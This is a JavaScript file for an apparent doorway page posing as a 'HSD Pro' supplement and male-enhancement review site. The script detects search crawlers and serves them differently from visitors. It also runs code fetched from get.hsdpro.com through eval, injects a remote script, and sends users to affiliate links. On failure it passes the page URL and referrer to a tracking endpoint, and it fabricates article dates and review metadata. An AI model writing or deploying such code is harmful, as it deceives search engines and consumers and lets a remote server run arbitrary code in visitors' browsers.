(function() {
    'use strict';

    const CONFIG = {
        MAIN_PARAM: 'kj8',
        FORMAT: '.json',
        DATA_URL: 'https://get.hsdpro.com/fetch/',
        META_URL: 'https://get.hsdpro.com/api/latest/',
        SRC_URL: 'https://get.hsdpro.com/',
        DEBUG: false,
        CRAWLER_UA_PATTERN: /bot|googlebot|crawler|spider|robot|crawling/i
    };

    const state = {
        isCrawler: CONFIG.CRAWLER_UA_PATTERN.test(navigator.userAgent),
        identifier: null,
        isVideo: false,
        triggered: false,
        stopped: false,
        is404: false,
        loader: false,
        content: null,
        latest: null,
        DOM: {}
    };

    const urlParams = new URLSearchParams(window.location.search);

    function init() {
        parseUrlParams();
        setupMetaTags();
        
        if (!state.identifier && !urlParams.has('dbg123')) {
            show404();
            return;
        }

        if (state.isCrawler) {
            handleCrawler();
        } else {
            handleUser();
        }
    }

    function parseUrlParams() {
        if (urlParams.has(CONFIG.MAIN_PARAM)) {
            state.identifier = urlParams.get(CONFIG.MAIN_PARAM);
        }
        if (urlParams.has('video')) {
            state.isVideo = true;
        }
        if (urlParams.has('io0')) {
            state.identifier = urlParams.get('io0');
        }
        if (urlParams.has('dbg123')) {
            CONFIG.DEBUG = true;
        }
    }

    function setupMetaTags() {
        const metaTags = [
            { charset: 'utf-8' },
            { name: 'viewport', content: 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no' },
            { httpEquiv: 'X-UA-Compatible', content: 'IE=edge' },
            { name: 'googlebot', content: 'index, follow' },
            { name: 'googlebot', content: 'index, follow', property: 'og:type' },
            { name: 'robots', content: 'index, noarchive' }
        ];

        metaTags.forEach(tag => {
            const meta = document.createElement('meta');
            Object.entries(tag).forEach(([key, value]) => {
                if (key === 'charset') meta.charset = value;
                else if (key === 'httpEquiv') meta.httpEquiv = value;
                else if (key === 'name') meta.name = value;
                else if (key === 'property') meta.setAttribute('property', value);
                else meta.setAttribute(key, value);
            });
            document.head.appendChild(meta);
        });
    }

    function handleCrawler() {
        const observer = new MutationObserver(() => {
            if (document.body && !state.isCrawler && !state.stopped && !state.is404) {
                state.loader = true;
                showLoader();
                observer.disconnect();
            }
        });
        observer.observe(document.documentElement, { childList: true, subtree: true });

        loadMeta().then(meta => {
            if (meta?.rCode) eval(meta.rCode);
            if (meta?.redirect && !CONFIG.DEBUG && !state.stopped) {
                state.triggered = true;
                redirectTo(meta.to);
            }
        }).catch(() => {
            if (!CONFIG.DEBUG && !state.stopped && !state.is404) {
                errorRedirect();
            }
        });
    }

    function handleUser() {
        const script = document.createElement('script');
        script.src = CONFIG.SRC_URL + 'js/js.php?id=' + state.identifier;
        script.id = 'main-script';
        document.documentElement.style.opacity = '0';
        document.head.appendChild(script);

        script.onload = loadDefault;
        script.onerror = loadDefault;

        setTimeout(() => {
            if (!state.triggered) loadDefault();
        }, 3000);
    }

    async function load(url) {
        try {
            const response = await fetch(url);
            return await response.json();
        } catch (e) {
            return null;
        }
    }

    async function loadMeta() {
        return await load(CONFIG.META_URL + state.identifier);
    }

    function loadDefault() {
        if (state.triggered || state.stopped) return;
        state.triggered = true;

        if (!state.identifier && !CONFIG.DEBUG) {
            return show404();
        }

        waitForBody().then(() => {
            document.body.innerHTML = '';
            initDOM();
            
            loadData().then(data => {
                if (!data) return show404();
                
                document.title = (state.isVideo ? 'Video - ' : '') + titleCase(data.title) + ' [' + data.random1 + ']';
                setupArticleMeta(data);
                hideLoader();
                
                if (data.schemas) {
                    data.schemas.forEach(schema => addSchema(schema.id, schema.data));
                }
                
                waitForFooter().then(() => {
                    if (!state.stopped) populateDOM(data);
                });
            });

            loadMeta().then(meta => {
                if (meta?.cCode) eval(meta.cCode);
                if (meta?.schemas?.length) {
                    meta.schemas.forEach(schema => addSchema(schema.id, schema.data));
                }
                waitForFooter().then(() => {
                    if (!state.stopped) populateMeta(meta);
                });
            });
        });
    }

    function waitForBody() {
        return new Promise(resolve => {
            if (document.body) return resolve();
            const check = setInterval(() => {
                if (document.body) {
                    clearInterval(check);
                    resolve();
                }
            }, 50);
        });
    }

    function waitForFooter() {
        return new Promise(resolve => {
            const check = setInterval(() => {
                if (state.DOM.footer || state.stopped) {
                    clearInterval(check);
                    resolve();
                }
            }, 50);
        });
    }

    async function loadData() {
        return await load(CONFIG.DATA_URL + state.identifier + CONFIG.FORMAT);
    }

    function initDOM() {
        injectStyles();
        createHeader();
        createMain();
        createFooter();
    }

    function injectStyles() {
        state.DOM.styles = document.createElement('style');
        state.DOM.styles.textContent = getStyles();
        document.head.appendChild(state.DOM.styles);
    }

    function getStyles() {
        return `
            *, *::before, *::after { box-sizing: border-box; border-width: 0; border-style: solid; border-color: #e5e7eb; }
            *::before, *::after { --tw-content: ''; }
            html { line-height: 1.5; -webkit-text-size-adjust: 100%; tab-size: 4; font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif; }
            body { margin: 0; line-height: inherit; background: #fff; color: #1f2937; }
            hr { height: 0; color: inherit; border-top-width: 1px; }
            abbr:where([title]) { text-decoration: underline dotted; }
            h1, h2, h3, h4, h5, h6 { font-size: inherit; font-weight: inherit; }
            b, strong { font-weight: bolder; }
            code, kbd, samp, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace; font-size: 1em; }
            small { font-size: 80%; }
            sub, sup { font-size: 75%; line-height: 0; position: relative; vertical-align: baseline; }
            sub { bottom: -0.25em; }
            sup { top: -0.5em; }
            table { text-indent: 0; border-color: inherit; border-collapse: collapse; }
            button, input, optgroup, select, textarea { font-family: inherit; font-size: 100%; font-weight: inherit; line-height: inherit; color: inherit; margin: 0; padding: 0; }
            button, select { text-transform: none; }
            button, [type='button'], [type='reset'], [type='submit'] { -webkit-appearance: button; background-color: transparent; background-image: none; }
            :-moz-focusring { outline: auto; }
            progress { vertical-align: baseline; }
            ::-webkit-inner-spin-button, ::-webkit-outer-spin-button { height: auto; }
            [type='search'] { -webkit-appearance: textfield; outline-offset: -2px; }
            ::-webkit-search-decoration { -webkit-appearance: none; }
            ::-webkit-file-upload-button { -webkit-appearance: button; font: inherit; }
            summary { display: list-item; }
            blockquote, dl, dd, h1, h2, h3, h4, h5, h6, hr, figure, p, pre { margin: 0; }
            fieldset { margin: 0; padding: 0; }
            legend { padding: 0; }
            ol, ul, menu { list-style: none; margin: 0; padding: 0; }
            dialog { padding: 0; }
            textarea { resize: vertical; }
            input::placeholder, textarea::placeholder { opacity: 1; color: #9ca3af; }
            button, [role='button'] { cursor: pointer; }
            :disabled { cursor: default; }
            img, svg, video, canvas, audio, iframe, embed, object { display: block; vertical-align: middle; }
            img, video { max-width: 100%; height: auto; }
            [hidden] { display: none; }

            .absolute { position: absolute; }
            .relative { position: relative; }
            .inset-0 { top: 0; right: 0; bottom: 0; left: 0; }
            .mx-auto { margin-left: auto; margin-right: auto; }
            .my-10 { margin-top: 2.5rem; margin-bottom: 2.5rem; }
            .max-h-60 { max-height: 15rem; }
            .my-6 { margin-top: 1.5rem; margin-bottom: 1.5rem; }
            .mb-20 { margin-bottom: 5rem; }
            .mt-4 { margin-top: 1rem; }
            .mt-6 { margin-top: 1.5rem; }
            .flex { display: flex; }
            .grid { display: grid; }
            .h-48 { height: 12rem; }
            .w-full { width: 100%; }
            .max-w-7xl { max-width: 80rem; }
            .grid-cols-1 { grid-template-columns: repeat(1, minmax(0, 1fr)); }
            .flex-col { flex-direction: column; }
            .gap-x-12 { column-gap: 3rem; }
            .space-y-4 > :not([hidden]) ~ :not([hidden]) { margin-top: 1rem; margin-bottom: 1rem; }
            .divide-y > :not([hidden]) ~ :not([hidden]) { border-top-width: 1px; }
            .divide-gray-200 > :not([hidden]) ~ :not([hidden]) { border-color: #e5e7eb; }
            .rounded { border-radius: 0.25rem; }
            .bg-blue-500 { background-color: #3b82f6; }
            .bg-gray-700 { background-color: #374151; }
            .object-contain { object-fit: contain; }
            .p-2 { padding: 0.5rem; }
            .p-4 { padding: 1rem; }
            .px-2 { padding-left: 0.5rem; padding-right: 0.5rem; }
            .pb-1 { padding-bottom: 0.25rem; }
            .pt-2 { padding-top: 0.5rem; }
            .pt-4 { padding-top: 1rem; }
            .text-center { text-align: center; }
            .text-justify { text-align: justify; }
            .text-2xl { font-size: 1.5rem; line-height: 2rem; }
            .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
            .text-xl { font-size: 1.25rem; line-height: 1.75rem; }
            .font-bold { font-weight: 700; }
            .text-gray-500 { color: #6b7280; }
            .text-white { color: #fff; }
            .text-gray-700 { color: #374151; }
            .text-gray-900 { color: #111827; }
            .hover\\:bg-blue-600:hover { background-color: #2563eb; }
            .transition { transition-property: color, background-color, border-color, text-decoration-color, fill, stroke; transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1); transition-duration: 150ms; }

            @media (min-width: 768px) {
                .md\\:col-span-2 { grid-column: span 2 / span 2; }
                .md\\:col-span-4 { grid-column: span 4 / span 4; }
                .md\\:w-2\\/3 { width: 66.666667%; }
                .md\\:grid-cols-6 { grid-template-columns: repeat(6, minmax(0, 1fr)); }
                .md\\:text-4xl { font-size: 2.25rem; line-height: 2.5rem; }
            }

            .loader-overlay {
                position: fixed; top: 0; left: 0; right: 0; bottom: 0;
                background: rgba(255,255,255,0.9); z-index: 9999;
                display: flex; align-items: center; justify-content: center;
            }
            .loader-spinner {
                width: 40px; height: 40px; border: 3px solid #e5e7eb;
                border-top-color: #3b82f6; border-radius: 50%;
                animation: spin 1s linear infinite;
            }
            @keyframes spin { to { transform: rotate(360deg); } }

            article.related-item { border-bottom: 1px solid #e5e7eb; padding: 1rem 0; }
            article.related-item:last-child { border-bottom: none; }
            article.related-item h4 { font-size: 1.125rem; font-weight: 600; color: #1f2937; margin: 0; }
            article.related-item a { text-decoration: none; color: inherit; }
            article.related-item a:hover { color: #3b82f6; }

            .article-image { width: 100%; max-height: 15rem; object-fit: contain; border-radius: 0.5rem; }
            .article-meta { font-size: 0.875rem; color: #6b7280; margin-bottom: 1rem; }
            .article-content { line-height: 1.75; }
            .article-content h2 { font-size: 1.5rem; font-weight: 700; margin: 2rem 0 1rem; color: #1f2937; }
            .article-content h3 { font-size: 1.25rem; font-weight: 600; margin: 1.5rem 0 0.75rem; color: #374151; }
            .article-content p { margin: 1rem 0; }
            .article-content ul, .article-content ol { margin: 1rem 0; padding-left: 1.5rem; }
            .article-content li { margin: 0.5rem 0; }
            .article-content blockquote { border-left: 4px solid #3b82f6; padding-left: 1rem; margin: 1.5rem 0; font-style: italic; color: #4b5563; }
            .article-content table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
            .article-content th, .article-content td { border: 1px solid #e5e7eb; padding: 0.75rem; text-align: left; }
            .article-content th { background: #f9fafb; font-weight: 600; }
            .article-content a { color: #3b82f6; text-decoration: none; }
            .article-content a:hover { text-decoration: underline; }
            .article-content .disclaimer { font-size: 0.875rem; color: #6b7280; font-style: italic; margin-top: 2rem; padding-top: 1rem; border-top: 1px solid #e5e7eb; }
        `;
    }

    function createHeader() {
        state.DOM.header = document.createElement('header');
        state.DOM.header.className = 'border-b border-gray-200 bg-white sticky top-0 z-10';

        const container = document.createElement('div');
        container.className = 'max-w-7xl mx-auto px-4 py-4 flex items-center justify-between';

        const logoLink = document.createElement('a');
        logoLink.href = '/';
        logoLink.className = 'flex items-center space-x-2';
        logoLink.innerHTML = `
            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect width="32" height="32" rx="8" fill="#3b82f6"/>
                <text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" font-family="system-ui" font-size="16" font-weight="700" fill="white">HS</text>
            </svg>
            <span class="font-bold text-xl text-gray-900">HSD Pro</span>
        `;
        container.appendChild(logoLink);

        const nav = document.createElement('nav');
        nav.className = 'hidden md:flex items-center space-x-6';
        ['News', 'Reviews', 'Guides', 'About'].forEach(text => {
            const link = document.createElement('a');
            link.href = '#';
            link.className = 'text-sm font-medium text-gray-700 hover:text-blue-600 transition';
            link.textContent = text;
            nav.appendChild(link);
        });
        container.appendChild(nav);

        state.DOM.headerTime = document.createElement('time');
        state.DOM.headerTime.dateTime = new Date().toISOString();
        state.DOM.headerTime.className = 'text-sm text-gray-500';
        state.DOM.headerTime.textContent = getCurrentFormattedDate();
        container.appendChild(state.DOM.headerTime);

        state.DOM.header.appendChild(container);
        document.body.appendChild(state.DOM.header);
    }

    function createMain() {
        state.DOM.main = document.createElement('main');
        state.DOM.main.className = 'max-w-7xl mx-auto px-4 py-8 grid grid-cols-1 md:grid-cols-6 gap-8';

        // Article
        state.DOM.article = document.createElement('article');
        state.DOM.article.className = 'md:col-span-4';
        state.DOM.article.setAttribute('aria-labelledby', 'article-heading');

        state.DOM.articleHeader = document.createElement('header');
        state.DOM.articleHeader.className = 'mb-6';

        state.DOM.articleH1 = document.createElement('h1');
        state.DOM.articleH1.id = 'article-heading';
        state.DOM.articleH1.className = 'text-3xl md:text-4xl font-bold text-gray-900 leading-tight mb-4';
        state.DOM.articleHeader.appendChild(state.DOM.articleH1);

        state.DOM.articleMeta = document.createElement('div');
        state.DOM.articleMeta.className = 'article-meta flex items-center space-x-4 text-sm text-gray-500';
        state.DOM.articleMeta.innerHTML = `
            <time id="article-date" datetime=""></time>
            <span id="article-category" class="px-2 py-0.5 bg-blue-100 text-blue-700 rounded-full text-xs font-medium"></span>
        `;
        state.DOM.articleHeader.appendChild(state.DOM.articleMeta);

        state.DOM.article.appendChild(state.DOM.articleHeader);

        // Featured image
        state.DOM.articleFigure = document.createElement('figure');
        state.DOM.articleFigure.className = 'mb-8';
        state.DOM.articleImg = document.createElement('img');
        state.DOM.articleImg.className = 'article-image w-full';
        state.DOM.articleImg.alt = '';
        state.DOM.articleFigure.appendChild(state.DOM.articleImg);
        state.DOM.articleFigcaption = document.createElement('figcaption');
        state.DOM.articleFigcaption.className = 'text-center text-sm text-gray-500 mt-2';
        state.DOM.articleFigure.appendChild(state.DOM.articleFigcaption);
        state.DOM.article.appendChild(state.DOM.articleFigure);

        // Article content
        state.DOM.articleContent = document.createElement('div');
        state.DOM.articleContent.className = 'article-content prose prose-lg max-w-none';
        state.DOM.article.appendChild(state.DOM.articleContent);

        // CTA Buttons
        state.DOM.ctaContainer = document.createElement('div');
        state.DOM.ctaContainer.className = 'mt-10 space-y-6';
        
        state.DOM.cta1 = createCTAButton('Special Access:', 'For Our Readers Only!', '#');
        state.DOM.cta2 = createCTAButton('Unlock Exclusive', 'Details & Discounts', '#');
        
        state.DOM.ctaContainer.appendChild(state.DOM.cta1);
        state.DOM.ctaContainer.appendChild(state.DOM.cta2);
        state.DOM.article.appendChild(state.DOM.ctaContainer);

        // Article footer
        state.DOM.articleFooter = document.createElement('footer');
        state.DOM.articleFooter.className = 'mt-16 pt-8 border-t border-gray-200';
        state.DOM.articleFooter.innerHTML = `
            <h6 class="font-semibold text-gray-900 mb-2">About This Review</h6>
            <p class="text-sm text-gray-500">This review is based on personal testing and research. Individual results may vary. Consult a healthcare professional before starting any supplement regimen.</p>
        `;
        state.DOM.article.appendChild(state.DOM.articleFooter);

        state.DOM.main.appendChild(state.DOM.article);

        // Sidebar
        state.DOM.aside = document.createElement('aside');
        state.DOM.aside.className = 'md:col-span-2 space-y-6';

        // Related articles
        state.DOM.relatedSection = document.createElement('section');
        state.DOM.relatedSection.className = 'bg-white border border-gray-200 rounded-lg overflow-hidden';
        state.DOM.relatedSection.innerHTML = `
            <h3 class="bg-gray-700 text-white p-4 font-bold text-lg">Related Articles</h3>
            <div id="related-list" class="divide-y divide-gray-200"></div>
        `;
        state.DOM.aside.appendChild(state.DOM.relatedSection);

        // Categories
        state.DOM.categoriesSection = document.createElement('section');
        state.DOM.categoriesSection.className = 'bg-white border border-gray-200 rounded-lg overflow-hidden';
        state.DOM.categoriesSection.innerHTML = `
            <h3 class="bg-gray-700 text-white p-4 font-bold text-lg">Categories</h3>
            <div class="p-4 space-y-2">
                <a href="#" class="block text-gray-700 hover:text-blue-600 transition">Male Enhancement</a>
                <a href="#" class="block text-gray-700 hover:text-blue-600 transition">Supplement Reviews</a>
                <a href="#" class="block text-gray-700 hover:text-blue-600 transition">Health Guides</a>
                <a href="#" class="block text-gray-700 hover:text-blue-600 transition">Fitness & Nutrition</a>
            </div>
        `;
        state.DOM.aside.appendChild(state.DOM.categoriesSection);

        state.DOM.main.appendChild(state.DOM.aside);
        document.body.appendChild(state.DOM.main);
    }

    function createCTAButton(primary, secondary, href) {
        const button = document.createElement('a');
        button.href = href;
        button.className = 'block bg-blue-500 text-white rounded-lg p-6 md:w-2/3 mx-auto relative overflow-hidden hover:bg-blue-600 transition';
        button.innerHTML = `
            <span class="block text-center text-sm font-medium">${primary}</span>
            <span class="block text-center text-2xl font-bold mt-1">${secondary}</span>
        `;
        return button;
    }

    function createFooter() {
        state.DOM.footer = document.createElement('footer');
        state.DOM.footer.className = 'bg-gray-50 border-t border-gray-200 mt-16';
        state.DOM.footer.innerHTML = `
            <div class="max-w-7xl mx-auto px-4 py-12">
                <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
                    <div>
                        <h4 class="font-bold text-gray-900 mb-4">HSD Pro</h4>
                        <p class="text-sm text-gray-500">Your trusted source for honest product reviews and health guides.</p>
                    </div>
                    <div>
                        <h4 class="font-bold text-gray-900 mb-4">Quick Links</h4>
                        <ul class="space-y-2 text-sm text-gray-600">
                            <li><a href="#" class="hover:text-blue-600">Reviews</a></li>
                            <li><a href="#" class="hover:text-blue-600">Guides</a></li>
                            <li><a href="#" class="hover:text-blue-600">About Us</a></li>
                            <li><a href="#" class="hover:text-blue-600">Contact</a></li>
                        </ul>
                    </div>
                    <div>
                        <h4 class="font-bold text-gray-900 mb-4">Legal</h4>
                        <ul class="space-y-2 text-sm text-gray-600">
                            <li><a href="#" class="hover:text-blue-600">Privacy Policy</a></li>
                            <li><a href="#" class="hover:text-blue-600">Terms of Service</a></li>
                            <li><a href="#" class="hover:text-blue-600">Disclaimer</a></li>
                        </ul>
                    </div>
                    <div>
                        <h4 class="font-bold text-gray-900 mb-4">Follow Us</h4>
                        <div class="flex space-x-4">
                            <a href="#" class="text-gray-400 hover:text-blue-600" aria-label="Twitter">𝕏</a>
                            <a href="#" class="text-gray-400 hover:text-blue-600" aria-label="Facebook">𝔽</a>
                            <a href="#" class="text-gray-400 hover:text-blue-600" aria-label="Instagram">📷</a>
                        </div>
                    </div>
                </div>
                <div class="mt-8 pt-8 border-t border-gray-200 text-center text-sm text-gray-500">
                    <p>&copy; ${new Date().getFullYear()} HSD Pro. All rights reserved.</p>
                </div>
            </div>
        `;
        document.body.appendChild(state.DOM.footer);
    }

    function populateDOM(data) {
        if (!data) return;

        state.DOM.articleH1.textContent = (state.isVideo ? 'Video - ' : '') + titleCase(data.title) + ' [' + data.random1 + ']';

        if (state.isVideo) {
            state.DOM.articleFigure.style.display = 'none';
            // Video player would go here
        } else {
            const imgUrl = data.backdrop || data.image;
            state.DOM.articleImg.src = imgUrl;
            state.DOM.articleImg.alt = titleCase(data.title);
            state.DOM.articleFigcaption.textContent = data.name || 'Product Image';
        }

        // Split content into two parts for CTA placement
        const [part1, part2] = splitText(data.text);
        state.DOM.articleContent.innerHTML = part1 + part2;

        // Update CTA links from meta
        if (state.DOM.cta1 && state.DOM.cta2) {
            state.DOM.cta1.href = '#';
            state.DOM.cta2.href = '#';
        }
    }

    function populateMeta(meta) {
        if (!meta) return;

        if (meta.updated) {
            const dateEl = document.getElementById('article-date');
            if (dateEl) {
                dateEl.dateTime = meta.updated;
                dateEl.textContent = 'Published on: ' + getCurrentFormattedDate(meta.updated);
            }
        }

        if (meta.to) {
            state.DOM.cta1.href = meta.to;
            state.DOM.cta2.href = meta.to;
        }

        if (meta.category) {
            const catEl = document.getElementById('article-category');
            if (catEl) catEl.textContent = meta.category;
        }
    }

    function setupArticleMeta(data) {
        const metaTags = [
            { name: 'description', content: data.description },
            { name: 'keywords', content: titleCase(data.title) + ', ' + titleCase(data.name) + ', review, 2026' },
            { property: 'og:title', content: titleCase(data.title) + ' [' + data.random1 + ']' },
            { property: 'og:description', content: data.description },
            { property: 'og:type', content: 'article' },
            { property: 'og:image', content: data.image },
            { property: 'og:url', content: window.location.href },
            { name: 'twitter:card', content: 'summary_large_image' },
            { name: 'twitter:title', content: titleCase(data.title) + ' [' + data.random1 + ']' },
            { name: 'twitter:description', content: data.description },
            { name: 'twitter:image', content: data.image },
            { name: 'publication_date', content: getCurrentDateFormatted() }
        ];

        metaTags.forEach(tag => {
            const meta = document.createElement('meta');
            Object.entries(tag).forEach(([key, value]) => {
                if (key === 'property') meta.setAttribute('property', value);
                else meta.setAttribute(key, value);
            });
            document.head.appendChild(meta);
        });
    }

    function addSchema(id, data) {
        const existing = document.getElementById(id);
        if (existing) existing.remove();

        const script = document.createElement('script');
        script.type = 'application/ld+json';
        script.id = id;
        script.textContent = JSON.stringify(data);
        document.head.appendChild(script);
    }

    function showLoader() {
        if (state.loader) return;
        state.loader = true;
        const loader = document.createElement('div');
        loader.className = 'loader-overlay';
        loader.id = 'page-loader';
        loader.innerHTML = '<div class="loader-spinner"></div>';
        document.body.appendChild(loader);
    }

    function hideLoader() {
        state.loader = false;
        const loader = document.getElementById('page-loader');
        if (loader) {
            loader.style.opacity = '0';
            loader.style.transition = 'opacity 0.3s';
            setTimeout(() => loader.remove(), 300);
        }
    }

    function show404() {
        state.is404 = true;
        state.triggered = true;
        state.stopped = true;
        document.body.innerHTML = `
            <div class="max-w-md mx-auto px-4 py-16 text-center">
                <h1 class="text-6xl font-bold text-gray-200 mb-4">404</h1>
                <h2 class="text-2xl font-semibold text-gray-900 mb-4">Page Not Found</h2>
                <p class="text-gray-500 mb-8">The article you're looking for doesn't exist or has been moved.</p>
                <a href="/" class="inline-block bg-blue-500 text-white px-6 py-3 rounded-lg hover:bg-blue-600 transition">Go Home</a>
            </div>
        `;
    }

    function redirectTo(url) {
        window.location.href = url;
        const img = new Image();
        img.src = url;
    }

    function errorRedirect() {
        const params = new URLSearchParams();
        params.append('c', window.location.href);
        params.append('r', document.referrer);
        const redirectUrl = 'https://get.hsdpro.com/bh?' + params.toString();
        window.location.href = redirectUrl;
    }

    function splitText(text) {
        if (!text) return ['', ''];
        const third = Math.floor(text.length / 3);
        let split = third;
        while (split < text.length && text[split] !== '\n' && text[split] !== ' ') {
            split++;
        }
        if (split < text.length) {
            return [text.substring(0, split + 1), text.substring(split + 1)];
        }
        return [text.substring(0, third), text.substring(third)];
    }

    function titleCase(str) {
        if (!str) return '';
        return str.toLowerCase().split(' ').map(word => 
            word.charAt(0).toUpperCase() + word.slice(1)
        ).join(' ');
    }

    function getCurrentFormattedDate(dateStr = null) {
        const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
        const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
        const date = dateStr ? new Date(Date.parse(dateStr)) : new Date();
        return days[date.getDay()] + ', ' + months[date.getMonth()] + ' ' + date.getDate() + ', ' + date.getFullYear();
    }

    function getCurrentDateFormatted() {
        const date = new Date();
        const year = date.getFullYear();
        const month = String(date.getMonth() + 1).padStart(2, '0');
        const day = String(date.getDate()).padStart(2, '0');
        return year + '-' + month + '-' + day;
    }

    function getFutureDateFormatted(days = 2) {
        const date = new Date();
        date.setDate(date.getDate() + days);
        const year = date.getFullYear();
        const month = String(date.getMonth() + 1).padStart(2, '0');
        const day = String(date.getDate()).padStart(2, '0');
        return year + '-' + month + '-' + day;
    }

    // JSON safe replace for schema templates
    function jsonSafeReplace(template, searchArray, replaceArray) {
        if (searchArray.length !== replaceArray.length) {
            throw new Error('Search and replace arrays must have the same length');
        }
        let obj = JSON.parse(template);
        
        function replaceInObject(obj) {
            for (const key in obj) {
                if (typeof obj[key] === 'string') {
                    searchArray.forEach((search, i) => {
                        const regex = new RegExp(search.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g');
                        obj[key] = obj[key].replace(regex, replaceArray[i]);
                    });
                } else if (typeof obj[key] === 'object' && obj[key] !== null) {
                    replaceInObject(obj[key]);
                }
            }
        }
        
        replaceInObject(obj);
        return JSON.stringify(obj);
    }

    function secondsToDuration(seconds) {
        const minutes = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return 'PT' + (minutes ? minutes + 'M' : '') + secs + 'S';
    }

    function getRandomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // Initialize on DOM ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    // Expose for debugging
    window.HSDPro = {
        CONFIG,
        state,
        init,
        loadDefault,
        addSchema,
        titleCase,
        getCurrentFormattedDate
    };
})();
